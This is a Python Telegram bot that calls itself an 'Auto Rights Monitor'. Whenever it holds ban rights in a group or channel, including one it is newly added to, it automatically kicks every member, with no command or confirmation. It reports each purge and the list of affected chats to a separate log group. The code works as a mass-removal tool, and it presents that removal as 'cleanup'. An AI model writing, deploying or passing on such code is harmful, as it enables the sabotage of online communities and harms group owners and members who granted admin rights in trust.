import os
import asyncio
import time
from telethon import TelegramClient, events
from telethon.errors import ChatAdminRequiredError

# ───── ENV ───── #
def get_env_var(name):
    value = os.environ.get(name)
    if value is None:
        print(f"⚠️ Environment variable {name} is missing.")
    return value

def to_int(value, name):
    if value is None:
        return None
    try:
        return int(value)
    except (TypeError, ValueError):
        print(f"⚠️ Environment variable {name} could not be parsed as an integer.")
        return None

BOT_TOKEN = get_env_var("BOT_TOKEN")
API_ID = to_int(get_env_var("API_ID"), "API_ID")
API_HASH = get_env_var("API_HASH")
LOG_GROUP_ID = to_int(get_env_var("LOG_GROUP_ID"), "LOG_GROUP_ID")

bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# ───── STATE ───── #
tracked_chats = set()
cleaned_chats = set()
error_chats = set()
active_cleanup_tasks = {}

# ───── CLEANUP FUNCTION ───── #
async def remove_all_members(chat):
    try:
        members = await bot.get_participants(chat)
        total = len(members)
        removed = 0
        start_time = time.time()

        await bot.send_message(
            LOG_GROUP_ID,
            f"🚀 Starting cleanup in **{chat.title}** (`{chat.id}`)\n"
            f"👥 Members: {total}"
        )

        for user in members:
            try:
                if user.id != (await bot.get_me()).id:
                    await bot.kick_participant(chat.id, user.id)
                    removed += 1
                    if removed % 20 == 0:
                        await bot.send_message(
                            LOG_GROUP_ID,
                            f"⚙️ Progress: {removed}/{total} removed in {chat.title}"
                        )
            except Exception as e:
                print(f"Error removing {user.id}: {e}")
                continue

        duration = round(time.time() - start_time, 2)
        msg = (
            f"✅ **Cleanup Completed**\n"
            f"🏷️ Group: {chat.title}\n"
            f"🆔 ID: `{chat.id}`\n"
            f"👤 Removed: {removed}/{total}\n"
            f"⏱️ Time: {duration} sec"
        )
        if getattr(chat, "username", None):
            msg += f"\n🔗 Link: https://t.me/{chat.username}"

        await bot.send_message(LOG_GROUP_ID, msg)
        cleaned_chats.add(chat.id)

    except ChatAdminRequiredError:
        await bot.send_message(
            LOG_GROUP_ID,
            f"⚠️ Lost ban rights in **{chat.title}** (`{chat.id}`), stopping cleanup."
        )

    finally:
        active_cleanup_tasks.pop(chat.id, None)

# ───── INITIAL CHAT SCAN ───── #
async def scan_all_chats():
    joined_chats = []
    async for dialog in bot.iter_dialogs():
        entity = dialog.entity
        if getattr(entity, "megagroup", False) or getattr(entity, "broadcast", False):
            if hasattr(entity, "id"):
                tracked_chats.add(entity.id)
                joined_chats.append(entity)

    # Log all joined chats
    msg = "📋 **Bot is added to the following groups/channels:**\n"
    for chat in joined_chats:
        msg += f"• {chat.title} (`{chat.id}`)\n"
    await bot.send_message(LOG_GROUP_ID, msg)

    await check_ban_rights(joined_chats)

# ───── BAN RIGHTS CHECK ───── #
async def check_ban_rights(chats):
    with_rights = []
    without_rights = []

    for chat in chats:
        try:
            perms = await bot.get_permissions(chat.id, "me")

            if perms.is_admin and perms.ban_users:
                with_rights.append(chat)
                if chat.id not in cleaned_chats and chat.id not in active_cleanup_tasks:
                    task = asyncio.create_task(remove_all_members(chat))
                    active_cleanup_tasks[chat.id] = task
            else:
                without_rights.append(chat)

        except Exception as e:
            if chat.id not in error_chats:
                await bot.send_message(LOG_GROUP_ID, f"⚠️ Error in `{chat.title}` (`{chat.id}`): {e}")
                error_chats.add(chat.id)

    # Log summary
    summary = (
        f"📊 **Permissions Check Summary**\n"
        f"✅ Groups/channels with ban rights: {len(with_rights)}\n"
        f"❌ Without ban rights: {len(without_rights)}\n"
        f"🔁 Total checked: {len(chats)}"
    )
    await bot.send_message(LOG_GROUP_ID, summary)

    if without_rights:
        msg = "❌ **Groups/channels WITHOUT ban rights:**\n"
        for chat in without_rights:
            msg += f"• {chat.title} (`{chat.id}`)\n"
        await bot.send_message(LOG_GROUP_ID, msg)

# ───── EVENT: Bot Added to New Group ───── #
@bot.on(events.ChatAction)
async def on_added(event):
    if event.user_added and event.user_id == (await bot.get_me()).id:
        chat = await event.get_chat()
        tracked_chats.add(chat.id)
        await bot.send_message(
            LOG_GROUP_ID,
            f"🆕 Bot added to: **{chat.title}** (`{chat.id}`)\nChecking permissions..."
        )
        await check_ban_rights([chat])

# ───── EVENT: Track Messages ───── #
@bot.on(events.NewMessage())
async def track_message_chats(event):
    if event.is_group or event.is_channel:
        chat = await event.get_chat()
        tracked_chats.add(chat.id)

# ───── /start COMMAND ───── #
@bot.on(events.NewMessage(pattern="/start"))
async def start_cmd(event):
    if event.is_private:
        await event.respond(
            "🤖 Bot is active.\n"
            "🔍 Monitoring all joined groups/channels.\n"
            "🧹 Auto cleanup will run where ban rights are available."
        )

# ───── MAIN ───── #
async def main():
    await bot.send_message(
        LOG_GROUP_ID,
        "✅ Bot started!\n"
        "🔄 Scanning all joined groups/channels for permissions..."
    )
    await scan_all_chats()
    while True:
        await asyncio.sleep(60)  # idle loop just to keep bot alive

print("🤖 Auto Rights Monitor Bot running...")
bot.loop.run_until_complete(main())
